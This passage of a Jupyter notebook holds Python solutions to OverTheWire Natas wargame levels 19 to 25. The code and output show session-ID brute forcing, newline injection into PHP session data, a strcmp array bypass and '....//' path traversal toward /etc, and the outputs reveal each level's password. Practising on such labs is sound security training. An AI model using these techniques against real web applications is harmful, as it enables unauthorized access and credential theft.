    "url = f'http://natas19.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "i = -1\n",
    "def task():\n",
    "    global i\n",
    "    while 'natas20' not in pwd:\n",
    "        i += 1\n",
    "        key = f'{i}-admin'.encode('utf-8').hex()\n",
    "        cookies = dict(PHPSESSID=key)\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if 'Username: natas20' in result.text:\n",
    "            clear_output()\n",
    "            print(f'password found. session id: {i}, key: {key}')\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "        print(f'testing session id {i}, key: {key}')\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1361\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password not found.\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "1527\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Reading from /var/lib/php/sessions/mysess_key<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21\n",
      "Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";admin|s:1:\"1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: admin => 1<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password found: fBPhv63cKE1lkQl04cE5CuFTzXe15NfiH\n"
     ]
    }
   ],
   "source": [
    "#natas20\n",
    "count = 20\n",
    "\n",
    "get_pwd()\n",
    "del pwd['natas21']\n",
    "natas = f'natas{count}'\n",
    "\n",
    "while 'natas21' not in pwd:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/index.php?debug=1'\n",
    "    cookies = dict(PHPSESSID='key')\n",
    "    params = dict(name='admin\\nadmin 1')\n",
    "    result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params)\n",
    "    print(len(result.text))\n",
    "    print(result.text)\n",
    "    if find_pwd(result):\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas21"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas21\n",
    "count = 21\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "url = f'http://natas{count}-experimenter.natas.labs.overthewire.org/index.php?submit=1&admin=1&bgcolor=blue&debug=1'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = dict(PHPSESSID=res.cookies.get('PHPSESSID'))\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas22"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fdIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas22\n",
    "count = 22\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "cookies = dict(PHPSESSID='1')\n",
    "params = dict(revelio=1)\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params, allow_redirects=False)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas23"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fMeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas23\n",
    "count = 23\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/?passwd=11iloveyou'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas24"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas24\", \"pass\": \"MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\" };</script></head>\n",
      "<body>\n",
      "<h1>natas24</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Password:\n",
      "<form name=\"input\" method=\"get\">\n",
      "    <input type=\"text\" name=\"passwd\" size=20>\n",
      "    <input type=\"submit\" value=\"Login\">\n",
      "</form>\n",
      "\n",
      "<br />\n",
      "<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />\n",
      "<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>  \n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas24\n",
    "count = 24\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "passwd = ''\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org?passwd[]={passwd}'\n",
    "result = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas25"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas25\", \"pass\": \"ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\" };</script></head>\n",
      "<body>\n",
      "\n",
      "<h1>natas25</h1>\n",
      "<div id=\"content\">\n",
      "<div align=\"right\">\n",
      "<form>\n",
      "<select name='lang' onchange='this.form.submit()'>\n",
      "<option>language</option>\n",
      "<option>de</option><option>en</option></select>\n",
      "</form>\n",
      "</div>\n",
      "\n",
      "<br />\n",
      "<b>Warning</b>:  include(/etc): failed to open stream: No such file or directory in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />\n",
      "<br />\n",
      "<b>Warning</b>:  include(): Failed opening 'language/../../../../../etc/' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />\n",
      "<br />\n",
      "<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />\n",
      "<h2></h2><br />\n",
      "<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />\n",
      "<p align=\"justify\"><br />\n",
      "<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />\n",
      "<div align=\"right\"><h6></h6><div><p>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#natas25\n",
    "count = 25\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "lang = '....//....//....//....//....//var/www/natas/natas25/logs/natas25_dsdatf2a8nrrl30ffhc25cnp95.log'\n",
    "lang = '....//....//....//....//....//etc/'\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "params = dict(lang=lang)\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), params=params)\n",
    "print(result.text)\n",
    "\n",
    "# find_pwd(result)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
